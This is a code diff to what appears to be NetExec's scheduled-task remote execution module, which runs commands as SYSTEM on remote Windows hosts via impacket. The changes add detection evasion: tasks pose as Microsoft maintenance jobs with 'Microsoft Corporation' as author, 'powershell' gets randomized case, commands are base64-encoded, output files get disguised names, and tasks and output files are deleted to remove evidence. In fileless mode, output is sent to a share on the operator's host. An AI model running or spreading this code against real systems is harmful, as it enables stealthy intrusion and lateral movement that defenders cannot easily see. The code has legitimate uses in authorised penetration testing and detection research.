@@ -1,11 +1,14 @@
 import os
+import base64
 from impacket.dcerpc.v5 import tsch, transport
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from nxc.helpers.misc import gen_random_string
 from time import sleep
-from datetime import datetime, timedelta
+from datetime import datetime
 import contextlib
+import random
+import uuid
 
 
 class TSCH_EXEC:
@@ -62,12 +65,42 @@ class TSCH_EXEC:
     def output_callback(self, data):
         self.__outputBuffer = data
 
-    def get_end_boundary(self):
-        # Get current date and time + 5 minutes
-        end_boundary = datetime.now() + timedelta(minutes=5)
-
-        # Format it to match the format in the XML: "YYYY-MM-DDTHH:MM:SS.ssssss"
-        return end_boundary.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
+    def get_legitimate_task_filename(self):
+        """Generate a more plausible task scheduler related filename"""
+        task_prefixes = ["TS", "Task", "Microsoft-Task", "Windows-Task", "TaskManager", "Schedule"]
+        extensions = ["wdb"]
+        
+        prefix = random.choice(task_prefixes)
+        extension = random.choice(extensions)
+        
+        # Generate different filename formats
+        formats = [
+            f"{prefix}_{uuid.uuid4().hex[:8].upper()}.{extension}",
+            f"{prefix}-{datetime.now().strftime('%Y%m%d')}.{extension}",
+            f"Microsoft-{prefix}-{gen_random_string(6).upper()}.{extension}"
+        ]
+        
+        return random.choice(formats)
+        
+    def get_legitimate_task_name(self):
+        """Generate a more plausible scheduled task name"""
+        vendors = ["Microsoft", "Windows", "System"]
+        components = ["Maintenance", "Update", "Diagnostics", "Performance", "Security", "Network"]
+        actions = ["Task", "Manager", "Monitor", "Service", "Scheduler"]
+        
+        formats = [
+            f"{random.choice(vendors)}-{random.choice(components)}-{random.choice(actions)}",
+            f"{random.choice(vendors)}{random.choice(components)}",
+            f"{random.choice(components)}{random.choice(actions)}"
+        ]
+        
+        task_name = random.choice(formats)
+        
+        # Sometimes add a random component ID
+        if random.choice([True, False]):
+            task_name = f"{task_name}-{uuid.uuid4().hex[:8].upper()}"
+            
+        return task_name
 
     def gen_xml(self, command, fileless=False):
         
@@ -77,14 +110,12 @@ class TSCH_EXEC:
             self.logger.debug("PowerShell command detected, keeping as is (user requested)")
             
             # case randomization
-            safer_command = command.replace("powershell", "poWerSheLL")
-            safer_command = safer_command.replace("POWERSHELL", "PoWeRsHeLL")
+            safer_command = command.replace("powershell", "poWerSheLL").replace("POWERSHELL", "PoWeRsHeLL")
             
         valid_system_filename_prefixes = [
             "DiagTrack-", "CompatTel-", "WindowsUpdate-", "NetTrace-", 
             "Defender-", "SIH-", "WER-", "Cluster-", "ws_trace-"
         ]
-        import random
         
         # Create a filename that looks like a legitimate Windows log or temp file
         system_prefix = random.choice(valid_system_filename_prefixes)
@@ -92,21 +123,40 @@ class TSCH_EXEC:
         random_suffix = gen_random_string(4)
         
         legit_filename = f"{system_prefix}{random_date}-{random_suffix}.log"
-
-        # get time boundaries
-        current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
         
-        xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+        # Use a more convincing task-related filename for output with .wdb extension
+        task_filename = self.get_legitimate_task_filename()
+        
+        current_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
+        self.logger.debug(f"Creation time: {current_time}")
+        
+        # Store in ProgramData as originally requested but with convincing filename
+        self.__output_filename = f"C:\\ProgramData\\{task_filename}"
+
+        if self.__retOutput:
+            if fileless:
+                local_ip = self.__rpctransport.get_socket().getsockname()[0]
+                ps_cmd = f"[IO.File]::WriteAllText('\\\\{local_ip}\\{self.__share_name}\\{legit_filename}', (& {{ {safer_command} }}))"
+            else:
+                ps_cmd = f"[IO.File]::WriteAllText('{self.__output_filename}', (& {{ {safer_command} }}))"
+        else:
+            ps_cmd = safer_command
+
+        # Generate Base64 encoded PowerShell command
+        b64 = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
+
+        # Create XML with a registration trigger but no time boundaries
+        # This will execute immediately when registered, regardless of target system time
+        return f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>{current_time}</Date>
     <Author>Microsoft Corporation</Author>
-    <Description>Diagnostics logging helper task</Description>
+    <Description>Scheduled system maintenance and diagnostics task</Description>
   </RegistrationInfo>
   <Triggers>
     <RegistrationTrigger>
-      <StartBoundary>{current_time}</StartBoundary>
-      <EndBoundary>{self.get_end_boundary()}</EndBoundary>
+      <Enabled>true</Enabled>
     </RegistrationTrigger>
   </Triggers>
   <Principals>
@@ -135,31 +185,16 @@ class TSCH_EXEC:
   </Settings>
   <Actions Context="LocalSystem">
     <Exec>
-      <Command>cmd.exe</Command>
-"""
-        if self.__retOutput:
-            if "systemroot" not in legit_filename.lower():
-                self.__output_filename = f"\\Windows\\Temp\\{legit_filename}"
-            else:
-                self.__output_filename = f"\\Windows\\Temp\\{gen_random_string(8)}.log"
-            
-            if fileless:
-                local_ip = self.__rpctransport.get_socket().getsockname()[0]
-                argument_xml = f"      <Arguments>/C {safer_command} &gt; \\\\{local_ip}\\{self.__share_name}\\{legit_filename} 2&gt;&amp;1</Arguments>"
-            else:
-                argument_xml = f"      <Arguments>/C {safer_command} &gt; {self.__output_filename} 2&gt;&amp;1</Arguments>"
-                
-            xml += argument_xml
-        else:
-            argument_xml = f"      <Arguments>/C {safer_command}</Arguments>"
-            xml += argument_xml
-
-        xml += """
+      <Command>%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command>
+      <Arguments>-EncodedCommand {b64}</Arguments>
     </Exec>
   </Actions>
-</Task>
-"""
-        return xml
+</Task>"""
+
+    def windows_path_to_smb(self, windows_path):
+        """Convert a Windows path to SMB path format correctly handling nested directories."""
+        # Remove drive letter and normalize slashes
+        return windows_path.replace("C:", "").replace("\\", "/").lstrip("/")
 
     def execute_handler(self, command, fileless=False):
         dce = self.__rpctransport.get_dce_rpc()
@@ -174,19 +209,8 @@ class TSCH_EXEC:
             self.logger.fail(f"Failed to connect to DCE/RPC service: {e!s}")
             return
 
-        import random
-        
-        legit_task_prefixes = [
-            "Microsoft-Windows-", "Microsoft-Diagnosis-", "Microsoft-Windows-Defender-",
-            "SystemRestore-", "WindowsUpdate-", "User-Feed-", "Power-Efficiency-", 
-            "Microsoft-Proxy-", "NetworkDiag-", "Office-Background-"
-        ]
-        
-        task_prefix = random.choice(legit_task_prefixes)
-        component = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(8))
-        
-        # Format looks like: Microsoft-Windows-Task-AF73B829
-        tmpName = f"{task_prefix}Task-{component}"
+        # Use the legitimate task name generator
+        tmpName = self.get_legitimate_task_name()
         
         # Log the name but don't show it's specially crafted
         self.logger.debug(f"Using task name: {tmpName}")
@@ -194,13 +218,14 @@ class TSCH_EXEC:
         xml = self.gen_xml(command, fileless)
 
         self.logger.debug(f"Task XML: {xml}")
-        self.logger.info(f"Creating task \\{tmpName}")
+        self.logger.info(f"Creating task: {tmpName}")
         
         try:
             # windows server 2003 has no MSRPC_UUID_TSCHS, if it bind, it will return abstract_syntax_not_supported
             dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
             dce.bind(tsch.MSRPC_UUID_TSCHS)
             tsch.hSchRpcRegisterTask(dce, f"\\{tmpName}", xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
+            self.logger.debug("Task registered successfully")
         except Exception as e:
             if hasattr(e, "error_code") and e.error_code and hex(e.error_code) == "0x80070005":
                 self.logger.fail("ATEXEC: Create schedule task got blocked.")
@@ -212,69 +237,73 @@ class TSCH_EXEC:
                 dce.disconnect()
             return
 
-        # After task creation, try to run it immediately
+        # With RegistrationTrigger without time boundaries, the task should run immediately
+        # But we'll still try to manually run it as a backup approach
         try:
-            self.logger.debug("Attempting to run the task immediately")
+            self.logger.debug("Attempting manual task execution...")
             tsch.hSchRpcRun(dce, f"\\{tmpName}", NULL)
             self.logger.debug("Task run request sent successfully")
         except Exception as e:
-            self.logger.debug(f"Could not run task immediately: {e!s}. Will rely on trigger")
-            
+            self.logger.debug(f"Manual execution failed: {e!s}, relying on registration trigger")
+        
+        # Give the task time to execute
+        sleep(3)
 
-        # Wait for task execution
+        # Wait for task execution with intelligent polling
         wait_attempts = 0
         done = False
         task_ran = False
-        
-        sleep(3)
-        
-        while not done and wait_attempts < 15:
+        max_attempts = 15
+                
+        while not done and wait_attempts < max_attempts:
+            # First check if output file exists (most reliable check)
+            if self.__retOutput and wait_attempts >= 2:  # After initial wait
+                try:
+                    self.logger.debug(f"Checking for output file (attempt {wait_attempts + 1})")
+                    smb_path = self.windows_path_to_smb(self.__output_filename)
+                    smbConnection = self.__rpctransport.get_smb_connection()
+                    smbConnection.getFile(self.__share, smb_path, self.output_callback)
+                    self.logger.debug("Found output file, task completed successfully")
+                    done = True
+                    task_ran = True
+                    break
+                except Exception as e:
+                    self.logger.debug(f"Output file check: {e}")
+            
+            # Then check task run status
             try:
-                self.logger.debug(f"Checking if task \\{tmpName} has run (attempt {wait_attempts + 1}/15)")
+                self.logger.debug(f"Checking task execution status (attempt {wait_attempts + 1}/{max_attempts})")
                 resp = tsch.hSchRpcGetLastRunInfo(dce, f"\\{tmpName}")
                 if resp["pLastRuntime"]["wYear"] != 0:
-                    self.logger.debug(f"Task \\{tmpName} has run")
+                    self.logger.debug(f"Task \\{tmpName} has run successfully")
                     done = True
                     task_ran = True
                 else:
-                    self.logger.debug(f"Task \\{tmpName} has not run yet, waiting...")
+                    self.logger.debug("Task has not completed yet, waiting...")
                     wait_attempts += 1
                     sleep(2)
             except Exception as e:
-                if "SCHED_S_TASK_HAS_NOT_RUN" in str(e):
-                    self.logger.debug("Task has not run yet (expected status), continuing to wait")
-                else:
-                    self.logger.debug(f"Error checking task: {e!s}")
-                
+                self.logger.debug(f"Status check: {e}")
                 wait_attempts += 1
                 sleep(2)
-                
-                if wait_attempts >= 7 and self.__retOutput:
-                    try:
-                        self.logger.debug("Attempting early output file check")
-                        smbConnection = self.__rpctransport.get_smb_connection()
-                        smbConnection.getFile(self.__share, self.__output_filename, self.output_callback)
-                        self.logger.debug("Found output file, task must have completed")
-                        done = True
-                        task_ran = True
-                        break
-                    except Exception:
-                        pass
 
+        # Clean up the task
         try:
-            self.logger.info(f"Deleting task \\{tmpName}")
+            self.logger.info(f"Deleting task: {tmpName}")
             tsch.hSchRpcDelete(dce, f"\\{tmpName}")
         except Exception as e:
             self.logger.debug(f"Error deleting task: {e!s}")
 
+        # Additional wait if needed
         if not task_ran and self.__retOutput:
-            self.logger.debug("Waiting additional time for command execution to complete")
+            self.logger.debug("Task status unclear, waiting additional time for potential output")
             sleep(3)
 
+        # Get command output if requested
         if self.__retOutput:
             if fileless:
                 # For fileless execution, read from the network share
-                max_attempts = 15
+                max_attempts = 10
                 attempts = 0
                 while attempts < max_attempts:
                     try:
@@ -291,58 +320,63 @@ class TSCH_EXEC:
                             self.logger.debug(f"Could not remove file {file_path}: {e}")
                         break
                     except OSError:
-                        sleep(2)
+                        sleep(1)
                         attempts += 1
             else:
                 smbConnection = self.__rpctransport.get_smb_connection()
-
                 tries = 1
-                sleep(1)
                 
+                # Properly convert Windows path to SMB path
+                smb_path = self.windows_path_to_smb(self.__output_filename)
                 output_basename = os.path.basename(self.__output_filename)
-                os.path.dirname(self.__output_filename.strip("\\"))
                 
-                # The __output_filename has the form "\Windows\Temp\filename.log"
-                # For SMB access, we need "Windows\Temp\filename.log" relative to the share
-                smb_relative_path = self.__output_filename.strip("\\")
-                
-                while True:
+                while tries <= self.__tries:
                     try:
-                        self.logger.info(f"Attempting to read output from {output_basename}")
-                        smbConnection.getFile(self.__share, smb_relative_path, self.output_callback)
+                        self.logger.info(f"Attempting to read output from: {self.__output_filename}")
+                        smbConnection.getFile(self.__share, smb_path, self.output_callback)
                         break
                     except Exception as e:
-                        if tries >= self.__tries:
-                            self.logger.fail("ATEXEC: Could not retrieve output file. It may have been detected by AV, or the task did not execute successfully.")
-                            break
                         if "STATUS_BAD_NETWORK_NAME" in str(e):
                             self.logger.fail(f"ATEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                             break
                         elif "STATUS_VIRUS_INFECTED" in str(e):
                             self.logger.fail("Command did not run because a virus was detected")
                             break
-                        
+                        elif "STATUS_OBJECT_PATH_NOT_FOUND" in str(e):
+                            self.logger.info(f"Path not found for {self.__output_filename}, trying alternate path...")
+                            # Try with just the filename in case path issues
+                            try:
+                                alternate_path = output_basename
+                                self.logger.debug(f"Attempting with alternate path: {alternate_path}")
+                                smbConnection.getFile(self.__share, alternate_path, self.output_callback)
+                                self.logger.debug("Successfully retrieved file with alternate path")
+                                break
+                            except Exception as alt_e:
+                                self.logger.debug(f"Alternate path also failed: {alt_e}")
                         # When executing powershell and the command is still running, we get a sharing violation
-                        if "STATUS_SHARING_VIOLATION" in str(e):
+                        elif "STATUS_SHARING_VIOLATION" in str(e):
                             self.logger.info(f"File {output_basename} is still in use, retrying...")
-                            tries += 1
-                            sleep(1)
                         elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                             self.logger.info(f"File {output_basename} not found, retrying...")
-                            tries += 2  # Increment by 2 instead of 10 to avoid exhausting tries too quickly
-                            sleep(1)
                         else:
                             self.logger.debug(f"Error reading output file: {e!s}. Retrying...")
-                            tries += 1
-                            sleep(1)
+                        
+                        tries += 1
+                        sleep(1)
+                        
+                        if tries > self.__tries:
+                            self.logger.fail("ATEXEC: Could not retrieve output file after maximum attempts.")
 
                 # Delete the file to remove evidence, but only if we successfully read it
-                if tries < self.__tries:
+                if tries <= self.__tries:
                     try:
-                        self.logger.debug(f"Cleaning up output file {output_basename}")
-                        smbConnection.deleteFile(self.__share, smb_relative_path)
+                        self.logger.debug(f"Deleting output file: {output_basename}")
+                        smbConnection.deleteFile(self.__share, smb_path)
                     except Exception as e:
                         self.logger.debug(f"Could not delete output file: {e!s}")
+                        # Try with just the filename as a fallback
+                        with contextlib.suppress(Exception):
+                            smbConnection.deleteFile(self.__share, output_basename)
 
         # Always ensure proper disconnect
         with contextlib.suppress(Exception):
